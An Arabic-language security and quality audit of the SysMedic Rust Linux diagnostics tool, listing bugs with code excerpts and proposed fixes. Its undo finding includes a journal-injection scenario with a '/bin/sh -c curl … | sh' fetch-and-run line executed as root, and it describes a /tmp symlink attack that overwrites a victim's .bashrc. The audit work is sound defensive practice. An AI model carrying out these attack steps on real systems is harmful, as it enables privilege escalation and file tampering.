## 1. الملخص العام لجودة المشروع

SysMedic أداة تشخيص صحّة لأنظمة Linux مكتوبة بـ Rust، تجمع بيانات النظام (CPU، الذاكرة، الأقراص، الحرارة، العمليات، الخدمات، الحزم، الشبكة، الأمان، SMART...) عبر مجمّعات (Collectors)، ثمّ تمرّرها على قواعد تشخيص نقية (Diagnostics) تُنتج «نتائج» (Findings) بمعرّفات مستقرّة، وتحسب درجة صحّة موزونة، مع قاعدة معرفة ثنائية اللغة (عربي/إنجليزي) ومحرّك إصلاحات آمن يعمل خلف polkit/pkexec، وواجهتين: CLI و GTK4/libadwaita.

**التقييم العام: مشروع جيد جداً معمارياً، فوق المتوسط بكثير لمشروع في الإصدار 0.1.** الهندسة المعمارية (Clean/Hexagonal Architecture) مطبَّقة بصدق: النواة `sysmedic-core` خالية تماماً من الإدخال/الإخراج، والمجمّعات تفصل الـ I/O عن دوال التحليل النقية القابلة للاختبار، والتشخيصات دوال نقية `fn(&Snapshot) -> Vec<Finding>`. الانضباط في الاختبارات نادر لمشروع بهذا العمر، وقرار الأمان في محرّك الإصلاح (قبول **معرّف الإصلاح فقط** عبر حدود الصلاحيات) قرار احترافي.

لكن تحت هذه المعمارية الأنيقة توجد فئة من المشكلات في **دقّة التحليل على الأنظمة الحقيقية** (اللغات غير الإنجليزية، توزيعات غير Debian، إصدارات systemd المختلفة، النوى بأحجام صفحات مختلفة) و**ثغرات أمنية محدّدة** في المسارات المميّزة (undo، الملفات المؤقتة، صلاحيات ملفات الحالة). هذه المشكلات لا تظهر في الاختبارات لأن الاختبارات تستخدم نصوصاً إنجليزية مثالية كـ fixtures — وهو بالضبط مكمن الخطر: الكود «يبدو» صحيحاً ومختبَراً، لكنه يعطي إجابات خاطئة بصمت على شريحة كبيرة من الأنظمة المستهدفة.

**الحكم المكثّف:** أساس ممتاز يستحق الاستثمار، مع 3 مشكلات حرجة و11 مشكلة عالية الخطورة يجب معالجتها قبل أي وصف بأنه «جاهز للإنتاج/1.0».

## 3. قائمة الأخطاء الحرجة مرتّبة حسب الأولوية

### 🔴 CRITICAL-1 — الأقراص الفاشلة في SMART تُسقَط بصمت (قاعدة `smart.failing` لا تُطلق عملياً)

- **الملفات:** `crates/sysmedic-collectors/src/util.rs:9-11` و `crates/sysmedic-collectors/src/smart.rs:27-34`
- **الدليل:**
  ```rust
  // util.rs
  pub fn run(cmd: &str, args: &[&str]) -> Option<String> {
      let output = Command::new(cmd).args(args).output().ok()?;
      if !output.status.success() {   // ← أي خروج غير صفري = None
          return None;
      }
      Some(String::from_utf8_lossy(&output.stdout).into_owned())
  }
  ```
- **المشكلة:** `smartctl` يستخدم **رمز خروج على شكل bitmask**: البِت 3 (القيمة 8) يُضبط عندما **يكون القرص فاشلاً/يحتضر**. أي أن `smartctl -H` على قرص يحتضر يخرج برمز غير صفري *بينما يطبع JSON صحيحاً يحتوي `"smart_status": {"passed": false}`*. الدالة `util::run` تتجاهل المخرجات كلها وتُرجع `None`، فيسجّل المجمّع خطأً مضلّلاً («smartctl يحتاج root») ويُستبعَد القرص الذي يحتاج القاعدة أكثر من غيره. القاعدة `smart.failing` (`rules.rs:562`) لا يمكن أن تُطلق إلا في الحالة النادرة التي يُبلّغ فيها JSON عن الفشل مع رمز خروج صفري.
- **مستوى الخطورة:** Critical.
- **التأثير:** يجري فحص على جهاز فيه قرص يتنبأ بفشل وشيك ⇐ SysMedic يُبلّغ أن التخزين «سليم» (والدرجة منتفخة بسبب M1) ⇐ فقدان بيانات. هذا يناقض الغرض الأساسي من الأداة.
- **أفضل الممارسات:** أدوات النظام يجب أن تفرّق بين «الأمر غير موجود / رُفض» و«الأمر نجح لكن أبلغ عن حالة سيئة». رموز الخروج bitmask (`smartctl`, `rsync`, `grep`) يجب التعامل معها بقناع بِتّي لا بـ `success()`.
- **الحلول الممكنة:**
  1. **خاص بـ smartctl:** قبول رموز الخروج غير الصفرية التي يُحلَّل معها stdout كـ JSON صالح (أو قناع: البِتات 0-2 أخطاء، البِتات ≥3 «بيانات موجودة»). *بسيط، يحلّ المشكلة مباشرة.*
  2. **عام:** إضافة نسخة من `util::run` تُرجع `(ExitStatus, String stdout, String stderr)` ليقرّر كل مستدعٍ بنفسه. *أنظف بنيوياً، يعالج فئة كاملة من الأخطاء (يشمل تشخيص أدقّ لـ collection_errors).*
- **التوصية:** الحل (2) — إضافة `util::run_captured()` تُرجع الحالة والمخرجات، واستخدامها في smart.rs مع قناع بِتّي. يعالج جذر المشكلة (فقدان التمييز بين أنواع الفشل) ويحسّن التشخيص عبر كل المجمّعات. التكلفة منخفضة (دالة واحدة + تعديل مستدعٍ واحد حرج).

### 🔴 CRITICAL-2 — تصعيد صلاحيات محتمل: مسار `undo` يعيد تنفيذ أوامر خام من ملف الحالة كـ root

- **الملفات:** `crates/sysmedic-fixes/src/lib.rs:78-88` (`undo`) و `crates/sysmedic-fixes/src/journal.rs:72-80` (`save`)
- **الدليل:**
  ```rust
  // lib.rs — undo ينفّذ entry.undo حرفياً
  let (title, undo_commands) = (entry.title.clone(), entry.undo.clone());
  for command in &undo_commands {
      runner.run(command)?;   // ← يُنفَّذ كـ root، بلا قائمة سماح
  }
  // journal.rs — save يكتب دون ضبط صلاحيات
  std::fs::write(&self.path, json)   // ← 0644 حسب umach، دون التحقق من الملكية
  ```
- **المشكلة:** على عكس `apply` — الذي يقبل **معرّف إصلاح فقط** ويعيد بناء الخطة من سجلّ مُصرَّف داخلياً (تصميم ممتاز) — فإن `undo` يقرأ أوامر `FixCommand{program, args}` عشوائية من `/var/lib/sysmedic/journal.json` وينفّذها كـ root دون أي تحقّق مقابل قائمة سماح. من يستطيع الكتابة في ذلك الملف يتحكّم بأمر يُنفَّذ كـ root. وملف الـ journal يُكتب بصلاحيات افتراضية (تابعة لـ umask، عادةً 0644) ودليله الأب يُنشأ بـ `create_dir_all` دون ضبط `0700` أو التحقق من الملكية.
- **مستوى الخطورة:** Critical (مشروط بإمكانية الكتابة في الملف؛ والتغليف الحالي لا يضمن `0700 root:root` — انظر التغليف).
- **سيناريو الهجوم:** مهاجم محلّي يكتب في الـ journal مُدخلاً بـ `undo: [{"program":"/bin/sh","args":["-c","curl … | sh"]}]`، ثمّ يُطلَق `sysmedic undo` (يشغّله المستخدم، أو يُطلَق ضمن نافذة `auth_admin_keep` — انظر F1) ⇐ ينفّذ الـ helper `/bin/sh -c …` كـ root ⇐ تصعيد صلاحيات كامل.
- **أفضل الممارسات:** المكوّن المميّز يجب ألّا يثق بأي مُدخل قابل للكتابة من غير root. مبدأ «أعِد اشتقاق الأمر من مصدر موثوق لا تخزّنه» يجب أن يشمل `undo` كما يشمل `apply`.
- **الحلول الممكنة:**
  1. **حصر الصلاحيات فقط:** إنشاء `/var/lib/sysmedic` بـ `0700 root:root`، وكتابة `journal.json` بـ `0600`، والتحقق من الملكية عند التحميل ورفض الملف إن لم يكن مملوكاً لـ root. *يزيل الشرط المُمَكِّن.*
  2. **إزالة الثقة كلياً:** عدم تخزين/إعادة تنفيذ الأوامر الخام؛ تخزين **معرّف الإصلاح** فقط واشتقاق أوامر الـ undo من السجلّ المُصرَّف نفسه (يطابق نموذج `apply`). *يزيل الجذر.*
  3. **قائمة سماح:** التحقق من `program` مقابل قائمة برامج مسموحة قبل تنفيذ أوامر الـ undo.
- **التوصية:** تطبيق (1) + (2) معاً. الحل (1) دفاع فوري رخيص، و(2) هو الإصلاح الجذري الذي يوحّد نموذج الثقة بين `apply` و`undo`. الحل (3) طبقة دفاع إضافية جيدة.

### 🔴 CRITICAL-3 — ملف مؤقت بمسار متوقّع في تصدير PDF (هجوم symlink + كشف معلومات)

- **الملف:** `crates/sysmedic-report/src/lib.rs:37-39`
- **الدليل:**
  ```rust
  let tmp = std::env::temp_dir().join("sysmedic-report.html");
  std::fs::write(&tmp, html).map_err(|e| format!("cannot write temp HTML: {e}"))?;
  ```
- **المشكلة:** مسار ثابت متوقّع في `/tmp` المشترك (CWE-377/CWE-59). مستخدم محلّي آخر ينشئ `/tmp/sysmedic-report.html` مسبقاً كـ symlink إلى ملف يستطيع الضحية الكتابة فيه؛ `fs::write` يتبع الـ symlink ويطمس الهدف. كما يُنشأ الملف بـ umask افتراضي (عادة 0644) فيصبح التقرير الكامل — أسماء العمليات، المنافذ المفتوحة، النتائج الأمنية — مقروءاً لكل مستخدم محلّي، ولا يُحذف أبداً بعد التحويل فيبقى الكشف دائماً.
- **مستوى الخطورة:** High (رُفِّع إلى Critical في هذا التقرير لاجتماع طمس-ملف-عشوائي + كشف-معلومات + غياب-حذف).
- **سيناريو الفشل:** جهاز متعدّد المستخدمين؛ مهاجم يربط المسار بـ `~victim/.bashrc`؛ يشغّل الضحية `sysmedic checkup --format pdf` ⇐ يُستبدل ملف تهيئة الـ shell عنده.
- **التوصية:** استخدام `tempfile::Builder::new().suffix(".html").tempfile()` (يعطي `O_EXCL`، `0600`، اسم عشوائي)، وإبقاء الـ handle حياً خلال التحويل، والحذف التلقائي عند انتهاء النطاق. `tempfile` موجود أصلاً كاعتمادية في الـ workspace.

## 4. الأخطاء عالية الخطورة (High)

### الدقّة على الأنظمة الحقيقية

- **H-1 — الأوامر الخارجية تُشغَّل دون تثبيت اللغة (`LC_ALL=C`).** `util.rs:8`. عدة محلّلات تنكسر على الأنظمة غير الإنجليزية:
  - `packages.rs:87` — `line.contains("[upgradable from")`: `apt` مُترجَم؛ على نظام ألماني يصبح `[aktualisierbar von: …]` ⇐ **التحديثات الأمنية المعلّقة تُبلَّغ كصفر بصمت** (ويُقتل تنبيه `alert.security_updates`).
  - `security.rs:44` — `out.contains("Status: active")`: `ufw` مُترجَم (`Status: Aktiv`) ⇐ جدار ناري فعّال يُبلَّغ كغير فعّال (نتيجة `security.firewall_inactive` كاذبة).
  - **الإصلاح:** سطر واحد في `util::run`: `.env("LC_ALL", "C").env("LANG", "C")`. يعالج الفئة كلها.

- **H-2 — لا مهلة زمنية على أي أمر خارجي؛ أمر واحد معلّق يجمّد الفحص كله.** `util.rs:7-13` وكل المجمّعات التي تشغّل أوامر (`df`، `smartctl`، `journalctl`...)، والمجمّعات تعمل تسلسلياً في `engine.rs:50-52`. `Command::output()` يحجب إلى ما لا نهاية. حالة واقعية: `df` يتعلّق على mount ميت (NFS/CIFS)؛ لا يُمرَّر `-l`. **الإصلاح:** مهلة 5-10 ث لكل أمر، والنظر في قراءة `/proc/self/mounts` + `statvfs` بدل `df`.

- **H-3 — تحليل أسماء وحدات `systemctl` يفقد الوحدات الفاشلة ويشوّه الأسماء التي تبدأ بـ `x`.** `services.rs:44-50`:
  ```rust
  .map(|u| u.trim_start_matches(['●', '*', 'x']).to_string())
  ```
  ثلاث مشكلات: (1) حين يُصدِر systemctl علامة الحالة كعمود مستقلّ (`× foo.service …` على systemd ≥ 253، وهي `×` U+00D7 لا ASCII `x`)، يكون الرمز الأول هو العلامة نفسها ⇐ يُقصّ فيصبح `""` فيُصفّى ⇐ **اسم الوحدة يُفقَد كلياً**. (2) `×` (U+00D7) ليست في مجموعة القصّ. (3) قصّ `x` يشوّه أسماء صحيحة: `xrdp.service` → `rdp.service`. **الإصلاح:** التحليل سطراً سطراً مع تخطّي رموز العلامات بدقّة، أو استخدام `systemctl list-units --failed --output=json`.

- **H-4 — تحليل `sshd_config` يطبّق أسبقية خاطئة ويتجاهل `Include`/`Match`.** `security.rs:26-38, 59-72`. الكود يطبّق «آخر توجيه يفوز» بينما دلالة sshd هي العكس: *«أول قيمة تُستخدَم»*. كما لا يعالج `Include /etc/ssh/sshd_config.d/*.conf` — الموقع الافتراضي لهذه الإعدادات على Ubuntu ≥ 22.04 و Debian 12 — ويعامل توجيهات داخل `Match` كأنها عامة. **النتيجة:** نتائج كاذبة موجبة/سالبة على قاعدتَي أمان SSH لا يمكن للمستخدم التوفيق بينها وبين `sshd -T`. **الإصلاح:** أخذ أول تطابق غير معلَّق، التوقّف عند أول `Match`، اتّباع `Include`، أو تفويض `sshd -T` عند root.

- **H-5 — حجم صفحة ثابت 4 KiB يُبلّغ RSS خاطئاً على نوى 16K/64K.** `process.rs:8`. RHEL/CentOS aarch64 و Asahi Linux تستخدم صفحات 16/64 KiB، و`/proc/<pid>/statm` بالصفحات ⇐ RSS مُبلَّغ أقلّ بـ 4×-16×. **الإصلاح:** قراءة حجم الصفحة وقت التشغيل عبر `libc::sysconf(_SC_PAGESIZE)`.

### الأمن (إضافة إلى الحرجة)

- **H-6 (F2 معدّلة) — الـ helper المميّز يثق بـ `PATH` للبرامج التي يشغّلها كـ root.** `command.rs:17` (`Command::new(&command.program)`)، والأوامر معرّفة كأسماء مجرّدة (`"apt-get"`, `"ufw"`, `"snap"`). يعتمد الأمان على تنظيف pkexec للبيئة — وهو مخفّف هشّ. **الأخطر:** `snapshot()` في `daemon/main.rs:26-32` يشغّل **كل المجمّعات كـ root**، و`security.rs`/`util.rs` يستدعيان `ufw`/`systemctl` بأسماء مجرّدة كـ root ⇐ نفس مخاطرة `PATH` تنتقل إلى المجمّعات في سياق الـ root. **الإصلاح:** مسارات مطلقة (`/usr/bin/apt-get`)، أو `Command::env_clear()` + `PATH` ثابت داخل الـ helper.

### التغليف والتوزيع

- **H-7 — `snapcraft.yaml`: `confinement: classic` يتعارض مع `extensions: [gnome]` — لا يُبنى أصلاً.** `packaging/snap/snapcraft.yaml:13` مقابل `:24`. Snapcraft يرفض الإضافات على الحبس classic. الادّعاء «manifest ready» في `packaging/README.md:11` غير دقيق. **الإصلاح:** إمّا strict + gnome extension، أو classic بلا الإضافة مع تجهيز مكتبات GTK عبر `stage-packages`.

- **H-8 — سياسة polkit `exec.path` تطابق تخطيط `.deb` فقط؛ مسار pkexec معطّل تحت Flatpak/Snap/AppImage.** `data/…policy:19` يربط التصريح بـ `/usr/libexec/sysmedic-fix-helper`، بينما الـ helper يُثبَّت في `/app/libexec/…` (flatpak) و`$SNAP/libexec/…` (snap). سياسة polkit المثبَّتة داخل sandbox الـ Flatpak لا يقرأها polkit المضيف أصلاً. **النتيجة:** الإصلاح التلقائي — الميزة الرئيسية — لا يعمل بصمت في 3 من 4 صيغ، وادّعاء README:70-72 غير صحيح. **الإصلاح:** توثيق أنّ الإصلاح لـ deb فقط حالياً (صدق)، أو تصميم خدمة نظام + D-Bus.

- **H-9 — حزمة `.deb` تُبنى على `ubuntu-latest` باعتمادية `libc6` بلا قيد إصدار.** `release.yml:19,27` و`build-deb.sh:56`. البناء على Ubuntu 24.04+ ⇐ يتطلّب glibc حديثاً، لكن `Depends: libc6` بلا قيد ⇐ تُثبَّت الحزمة على أنظمة أقدم ثمّ تفشل وقت التشغيل بـ `GLIBC_2.3x not found`. ومكتبات GTK في `Recommends:` فقط ⇐ `--no-install-recommends` يعطي واجهة لا تُقلع. **الإصلاح:** البناء على أقدم LTS مدعوم أو حاوية، وتوليد `Depends` عبر `dpkg-shlibdeps`.

- **H-10 — الـ Actions مثبَّتة بوسوم قابلة للتغيير، مع action طرف ثالث يملك `contents: write`.** `release.yml` يمنح `softprops/action-gh-release@v2` صلاحية الكتابة — ناقل هجوم سلسلة توريد كلاسيكي. **الإصلاح:** تثبيت كل الـ actions على SHA كاملة + `dependabot.yml`.

## 6. فرص تحسين الأداء

5. **إضافة مهلة لطلب LLM** (M-9) — تجربة مستخدم لا أداء بحت، لكنه يمنع التعليق اللانهائي.

## 15. نقاط القوّة (ما نُفِّذ باحترافية)

هذه ليست مجاملة — هي عناصر يجب **الحفاظ عليها** أثناء أي إعادة هيكلة:

1. **فصل معماري نظيف (Hexagonal):** `sysmedic-core` خالية فعلاً من I/O؛ trait‑ا `Collector`/`Diagnostic` يجعلان المحرّك قابلاً للاختبار بسهولة، و`Engine::diagnose` على `Snapshot` جاهز مثالي للـ fixtures.
2. **`Snapshot` كله اختياري + `collection_errors`:** التدهور الرشيق مُصمَّم لا مُرقَّع، والتعليقات تشرح *لماذا* كل تخطٍّ صامت مقبول (حاويات، لا بطارية، لا smartmontools).
3. **صفر ذعر في الإنتاج** عبر كل كود المجمّعات/التشخيص؛ نمط `Option`/`let-else` متّسق.
4. **جودة التحليل حيث يهمّ:** معالجة الأقواس في `comm` عبر `rfind(')')`، فكّ عناوين IPv4 little-endian مع تعليق، تحليل مدد systemd المركّبة.
5. **الاختبار الفوقي `every_emitted_id_is_declared`** الذي يضمن تغطية قاعدة المعرفة لكل معرّف نتيجة — انضباط نادر. وقاعدة معرفة عربية فصيحة طبيعية لا آلية.
6. **عقد `FixPlan`:** program+args مُبنيَن (لا نصوص shell)، قابلية عكس/undo/مخاطرة صريحة، ومعاينة إلزامية قبل التأكيد — تصميم أمان جيّد فعلاً، وحدود ثقة `apply` ممتازة.
7. **CI فوق المتوسط بكثير:** fmt + clippy `-D warnings` + اختبارات + بناء release + **7 خطوات تشغيل دخانية** تمارس أوامر فرعية حقيقية + بناء `.deb` والتحقّق منه داخل CI.
8. **نظافة الاعتماديات:** صفر اعتماديات غير مستخدمة (مُتحقَّق بالـ grep)، شجرة صغيرة، `default-features = false` على `ureq`، `Cargo.lock` مُودَع و`--locked` عند الإصدار.
9. **نموذج الخيوط الصحيح في GUI:** المحرّك وفحص القرص عبر `gio::spawn_blocking` داخل `glib::spawn_future_local`؛ حلقة الأحداث لا تُحجَب، وكل نصّ غير موثوق يمرّ عبر `glib::markup_escape_text`.
10. **MVVM حقيقي:** `viewmodel.rs` بلا أي أنواع GTK وله اختبارات فعلية.
11. **treemap نموذجي:** تنفيذ squarified نظيف خالٍ من cairo فالرياضيات قابلة للاختبار.
12. **وثائق متماسكة وصادقة:** `docs/ISSUES.md` يتتبّع ما لم يُنجَز بأمانة، وCHANGELOG يتبع Keep-a-Changelog، وXML صالح في كل ملفات البيانات.
